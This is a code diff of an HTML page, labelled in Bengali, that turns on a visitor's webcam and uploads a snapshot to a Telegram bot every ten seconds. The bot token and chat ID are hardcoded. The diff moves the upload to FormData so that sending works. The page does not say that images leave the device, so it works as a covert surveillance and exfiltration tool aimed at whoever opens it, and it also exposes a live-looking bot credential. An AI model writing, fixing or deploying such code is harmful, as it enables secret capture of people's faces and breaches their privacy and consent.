@@ -1,56 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Auto Face Capture to Telegram</title>
+  <title>Face Capture Telegram</title>
 </head>
 <body>
-  <video id="video" width="300" autoplay></video>
+  <video id="video" width="320" height="240" autoplay></video>
   <canvas id="canvas" style="display:none;"></canvas>
   <p id="status">লোড হচ্ছে...</p>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-    const status = document.getElementById('status');
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
+    const status = document.getElementById("status");
 
     const botToken = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
     const chatId = "6429244657";
 
-    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-      video.srcObject = stream;
-      status.innerText = "ক্যামেরা চালু হয়েছে।";
-    }).catch(err => {
-      status.innerText = "ক্যামেরা চালু হয়নি: " + err;
-    });
+    function log(msg) {
+      console.log(msg);
+      status.innerText = msg;
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
+        log("ক্যামেরা চালু হয়েছে");
+      })
+      .catch((err) => {
+        log("ক্যামেরা সমস্যা: " + err.message);
+      });
 
     function sendPhoto() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL("image/jpeg");
+      
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("caption", "মুখ শনাক্ত হয়েছে");
+        formData.append("photo", blob, "face.jpg");
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          photo: imageData,
-          caption: "নতুন মুখ শনাক্ত হয়েছে!"
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
         })
-      })
-      .then(res => res.json())
-      .then(data => {
-        console.log("সফলভাবে পাঠানো হয়েছে:", data);
-        status.innerText = "ছবি পাঠানো হয়েছে!";
-      })
-      .catch(err => {
-        console.error("ত্রুটি:", err);
-        status.innerText = "ছবি পাঠাতে ব্যর্থ: " + err.message;
-      });
+        .then((res) => res.json())
+        .then((data) => {
+          console.log("Response:", data);
+          if (data.ok) {
+            log("ছবি পাঠানো হয়েছে");
+          } else {
+            log("ত্রুটি: " + JSON.stringify(data));
+          }
+        })
+        .catch((err) => {
+          log("ফেচ ত্রুটি: " + err.message);
+        });
+      }, "image/jpeg");
     }
 
-    setInterval(sendPhoto, 10000); // প্রতি ১০ সেকেন্ডে একবার ছবি পাঠাবে
+    setInterval(sendPhoto, 10000); // ১০ সেকেন্ড পরপর ছবি পাঠাবে
   </script>
 </body>
 </html>
